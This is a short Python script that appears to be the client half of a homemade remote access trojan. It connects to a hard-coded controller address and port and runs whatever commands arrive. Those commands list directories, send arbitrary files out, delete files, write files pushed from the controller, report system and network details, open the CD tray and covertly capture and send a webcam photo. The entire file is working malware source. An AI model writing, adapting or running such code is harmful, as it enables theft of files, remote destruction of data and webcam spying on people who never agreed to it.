import os
import cv2
import socket
import platform
import ctypes
import winsound

s = socket.socket()
port = 4242
host = "192.168.0.4"
s.connect((host,port))
print("\nConnected to the server\n")

while 1:
    command = s.recv(1024)
    command = command.decode()
    print("")
    print("Affirmative!")
    print("")
    if command == "view_cwd":
        files = os.getcwd()
        s.send(files.encode())
        print("")
        print("Affirmative! ")
        print("")
    elif command == "custom_dir":
        user_input = s.recv(5000)
        user_input = user_input.decode()
        files = os.listdir(user_input)
        files = str(files)
        s.send(files.encode())
        print("")
        print("Affirmative! ")
        print("")
    elif command == "download_file":
        file_path = s.recv(5000)
        file_path = file_path.decode()
        file = open(file_path, "rb")
        data = file.read()
        s.send(data)
        print("")
        print("Affirmative! ")
        print("")
    elif command == "remove_file":
        fileanddir = s.recv(6000)
        fileanddir = fileanddir.decode()
        os.remove(fileanddir)
        print("")
        print("Affirmative! ")
        print("")
    elif command == "send_file":
        filename = s.recv(6000)
        new_file = open(filename, "wb")
        data = s.recv(6000)
        new_file.write(data)
        new_file.close()
    elif command == "get_ip":
        hostname = socket.gethostname()
        Ip = socket.gethostbyname(hostname) 
        s.send(Ip.encode())
    elif command == "open_cd":
        os_name = platform.system()
        s.send(os_name.encode())
        if os_name == "Windows":
            ctypes.windll.WINMM.mciSendStringW(u"set cdaudio door open", None, 0, None)
        elif os_name == "Darwin" or os_name == "Linux":
            not_aviable_txt = "The Operating system is not aviable to open CD"
            s.send(not_aviable_txt.encode())
    elif command == "beep_it":
        print("Negatif")
    elif command == "sys_info":
    	info1 = platform.machine()
    	info2 = platform.version()
    	info3 = platform.platform()
    	s.send(info1.encode())
    	s.send(info2.encode())
    	s.send(info3.encode())
    elif command == "get_pic":
        camera = cv2.VideoCapture(0)
        return_value,image = camera.read()
        cv2.imwrite('test.jpg',image)
        camera.release()
        cv2.destroyAllWindows()
        my_pic = open("test.jpg", "rb")
        my_pic_data = my_pic.read()
        s.send(my_pic_data)
        my_pic.close()
        os.remove("test.jpg")
    else:
        print("[-] Negative!")
